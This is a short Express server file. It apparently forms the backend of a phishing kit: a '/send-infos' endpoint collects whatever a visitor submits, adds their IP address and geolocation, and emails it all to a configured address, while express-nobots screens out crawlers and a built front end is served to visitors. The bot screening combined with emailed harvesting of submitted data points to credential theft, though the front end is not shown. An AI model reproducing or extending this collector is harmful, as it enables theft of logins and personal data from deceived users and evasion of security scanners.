import express from "express";
import tableify from "tableify";
import noBots from "express-nobots";
import geoip from "geoip-lite";

require("dotenv").config();

import { sendEmail } from "./utils/sendEmail";
import path from "path";

const app = express();

const port = process.env.PORT || 5000;

app.use(noBots());
app.use(express.json());

app.post("/send-infos", async (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);
    const values = req.body;
    await sendEmail(
      process.env.EMAIL_ADDRESS as string,
      `${tableify([values, { ip, ...geo }])}`
    );
    res.send(Promise.resolve());
  } catch (error) {
    console.log(error);
  }
});

app.use(express.static(path.join(__dirname, "../build")));
app.get("/*", (_, res) => {
  res.sendFile(path.join(__dirname, "../build", "index.html"));
});

app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
